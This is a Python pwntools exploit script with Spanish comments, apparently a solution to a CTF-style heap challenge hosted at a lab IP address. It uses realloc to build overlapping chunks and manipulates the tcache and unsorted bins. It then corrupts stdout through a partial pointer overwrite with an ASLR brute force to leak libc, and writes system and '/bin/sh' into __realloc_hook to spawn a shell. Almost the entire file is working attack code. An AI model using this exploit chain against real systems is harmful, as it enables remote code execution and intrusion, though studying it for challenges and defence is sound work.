#!/usr/bin/python3
from pwn import *
from time import sleep
import sys

elf = context.binary = ELF("bin")
libc = elf.libc
context.terminal = ['tmux', 'splitw', '-hp', '70']
gs = '''
continue
'''
#modificar a 1 segundo para explotar remoto
t = 0.1
def start():
    if args.GDB:
        #t=0.1
        return gdb.debug(elf.path, gdbscript=gs)
    
    if args.REMOTE:
        #t = 1
        return remote('10.129.2.23',9989)
    else:
        #t = 0
        return process(elf.path)

def add(index, size, data):

    r.sendline(f"add {str(index)}")
    r.sendlineafter("size: ", f"{str(size)}")
    sleep(t)
    r.sendlineafter("content: ", data)
    sleep(t)

def rm(index):
    r.sendline(f"rm {index}")
    sleep(t)
def edit_1(index, size):
    r.sendline(f"edit {str(index)}")
    sleep(t)
    r.sendlineafter("size: ", str(size))
    sleep(t)
    #r.sendlineafter("content: ", data)

def edit_2(index, size,data):
    r.sendline(f"edit {str(index)}")
    r.sendlineafter("size:", str(size))
    sleep(t)
    r.sendlineafter("content:", data)
    sleep(t)

r = start()

r.recvuntil("$ ")
#=========== exploit     ===========
#Agreganbdo un chunk de size 50
#recoredar que agregando -8 se genera un chunk del size deseado
log.info("iniciando")
add(0, 0x48, "A")
rm(0)
#generando overlaping chunks
#usando realloc, podemos generar chunks que se sobreponen
log.info("creando chunks sobrepuestos")
add(0,0x68, b"AAAAAAAAA")
edit_1(0,0)
edit_2(0,0x18,"BBBBBBBBBBBBBBBBB")
rm(0)

add(0, 0x48, b"AAAAAAAA")
edit_1(0,0)
edit_2(0,0x48, p64(0xdeadbeef)+p64(0xcafebabe))
rm(0)
add(0, 0x48, "AAAAAAAAA")
#crando un unsorted bin de size 0x451 como "fake chunk"

log.info("creand un fake chunk, size 0x450")
add(1, 0x68, b"Y"*0x18+p64(0x451)+p64(0)+p64(0))
rm(1)
#loopeando para llenar/vacias el tcache
#necesitaremos size 0x80 mas adelante
log.info("looping")
for i in range(9):
    add(1, 0x58, "")
    edit_2(1,0x70, p64(0))
    rm(1)

add(1,0x58,"A")
rm(1)
# liberando el chunk de size 0x451
#generandp un unsorted bin
log.info("generando unsorted bin")
edit_1(0,0)
#editar chunk para modificar el valor del fd a stdout
log.info("escribiendo stdout")
#escribiendo los ultimos bytes de stdout
#el 4 bit esta sujeto a ASLR por tanto es un bruteforce de 1 en 16
edit_2(0,2,p16(0x6760))

add(1,0x48, "")
edit_2(1,0x18, "")
rm(1)

edit_2(0,0x18, "CCCCCCCCCCCCCCCCC")
rm(0)
log.info("iniciando brute force")

add(0,0x48, p64(0xfbad1800)+ p64(0)*2+b"dpla:".rjust(8,b"\x00"))
a = r.recvuntil("dpla:",timeout=2)
if (len(a) == 0):
    log.info("fail!!!!")
    r.close()
    log.info("saliendo")
    sys.exit(0)
    #recieviendo el leak
r.recvline()
leak = u64(r.recv()[7:15].ljust(8, b"\x00"))
libc.address = leak - 0x1e57e3
#lekeando
log.info(f"leak = {hex(leak)}")
log.info(f"libc = {hex(libc.address)}")
log.info(f"system = {hex(libc.sym.system)}")
log.info(f"hook = {hex(libc.sym.__realloc_hook)}")

#creando chunks sobrepuestos nuevamente
add(1,0x70,"XXXXXXXX")
edit_1(1,0)
edit_2(1,0x18,"BBBBBBBBBCCCCCCCC")
rm(1)
log.info("comenzando el exploiting")
#creando un chunk en el realloc hook
add(1,0x70, b"Y"*0x18+p64(0x61)+p64(libc.sym.__realloc_hook-8))
rm(1)

#desarmando el chunk para luego poder requerir el chunk de 0x60
log.info("Escribiendo la direccion de system + /bin/sh en realloc hook")
add(1,0x58,"")
edit_2(1,0x28, "")
rm(1)
add(1,0x58, b"/bin/sh\0"+p64(libc.sym.system))

log.info("GO!")
#realloc para llamar al hook y obtener shell shell
edit_1(1,0)

#=========== interactive ========
r.interactive()
